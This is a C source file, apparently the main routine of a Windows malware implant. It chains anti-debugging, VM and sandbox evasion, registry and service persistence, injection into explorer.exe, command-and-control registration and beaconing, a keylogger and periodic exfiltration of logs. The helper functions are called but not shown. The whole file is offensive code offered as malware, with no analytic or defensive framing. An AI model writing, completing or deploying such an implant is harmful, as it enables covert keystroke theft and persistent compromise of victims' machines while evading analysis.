#include "malware.h"

// Define obfuscated strings (initialised later)
char OBF_AGENT[32] = {0};
char OBF_DOMAIN[16] = {0};
char OBF_COMMAND[16] = {0};
char OBF_UPLOAD[16] = {0};

// Global state variables
char CLIENT_ID[64] = {0};          // Unique client identifier
volatile BOOL running = TRUE;      // Main loop control flag
DWORD sleep_until = 0;             // Timestamp for sleep expiration
DWORD beacon_interval = BEACON_INTERVAL; // Dynamic beacon interval

// Console event handler for graceful shutdown
BOOL WINAPI ConsoleHandler(DWORD signal) {
    if (signal == CTRL_CLOSE_EVENT) {
        running = FALSE;  // Set termination flag
        return TRUE;      // Indicate event handled
    }
    return FALSE;         // Pass other events to system
}

// Main entry point for Windows application
int WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, 
                   LPSTR lpCmdLine, int nCmdShow) {
    // Setup console for debugging
    //AllocConsole();
    //freopen("CONOUT$", "w", stdout);
    //SetConsoleCtrlHandler(ConsoleHandler, TRUE);
    
    printf("[+] Starting malware initialisation\n");
    
    // Initialise obfuscated strings first
    InitObfuscatedStrings();   
 
    // Completion Functionality (commented out but available)
    // Basic Evasion Techniques
    AddAntiDebugging();      // Check for debuggers
    AddAntiDumping();        // Prevent memory dumping

    // Environment Checks
    printf("[+] Performing environment checks\n");
    if (IsDebugged()) {
        printf("[-] Debugger detected! Exiting\n");
        ExitProcess(0);
    }

    if (IsVM()) {
        printf("[-] VM detected! Exiting\n");
        ExitProcess(0);
    }
    
    
    AddSandboxEvasion();     // Check for sandbox environments
    
    // Anti-Analysis
    AddAntiAnalysis();       // Check for analysis tools
    
    // Persistence Mechanisms
    InstallPersistence();    // Registry persistence
    InstallService();        // Service persistence (additional)
    
    // Process Injection
    AddProcessInjection();   // Inject into explorer.exe
    
    // Network Evasion
    AddNetworkEvasion();     // Randomise beacon timing
    
    // Code Obfuscation 
    //ApplyPolymorphicMask();  // Polymorphic code
    //ObfuscateCriticalFunctions(); // Memory obfuscation
    
    // Core Functionality
    printf("\n[+] Initialising core functionality\n");
    GenerateClientID();      // Create unique client identifier
    RegisterWithC2();        // Register with command & control server
    
    // Initial beacon and keylogger start
    BeaconToC2(FALSE);
    StartKeylogger();
    
    // Timing control variables
    DWORD last_beacon = GetTickCount();
    DWORD last_exfil = GetTickCount();
    
    // Main Operation Loop
    while (running) {
        DWORD current = GetTickCount();
        
        // Sleep mode handling
        if (sleep_until && current >= sleep_until) {
            sleep_until = 0;                     // Clear sleep flag
            beacon_interval = BEACON_INTERVAL;   // Reset to default interval
            printf("[+] Wake up from sleep\n");
        }
        
        // Normal operation when not sleeping
        if (!sleep_until) {
            // Periodic beacon to C2
            if (current - last_beacon >= beacon_interval) {
                BeaconToC2(FALSE);
                last_beacon = current;  // Update last beacon time
            }
            
            // Periodic log exfiltration
            if (current - last_exfil >= EXFIL_INTERVAL) {
                printf("[%lu] Exfiltrating logs...\n", current);
                ExfiltrateLogs();
                last_exfil = current;  // Update last exfiltration time
            }
        }
        
        Sleep(1000);  // Reduce CPU usage
    }
    
    // Cleanup and Shutdown
    printf("[+] Sending shutdown beacon...\n");
    BeaconToC2(TRUE);  // Notify C2 of shutdown
    
    printf("[+] Cleaning up resources...\n");
    FreeConsole();  // Release console
    return 0;       // Exit process
}